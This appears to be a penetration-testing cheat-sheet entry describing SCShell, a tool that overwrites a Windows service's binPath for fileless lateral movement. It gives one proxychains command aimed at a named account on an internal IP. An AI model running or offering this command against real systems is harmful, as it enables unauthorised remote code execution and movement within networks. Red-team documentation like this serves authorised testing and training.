---
title: SCShell - Service Hijack Lateral Movement
category: ad
subcategory: ad-lateral
os: linux
command: proxychains python3 scshell.py user@target
tools: scshell
---


SCShell uses the Service Control Manager to overwrite a service binPath, giving fileless lateral movement.

### Run via Proxychains

```bash
proxychains python3 scshell.py svc-auth@172.16.242.176
```

Reference: https://github.com/Mr-Un1k0d3r/SCShell
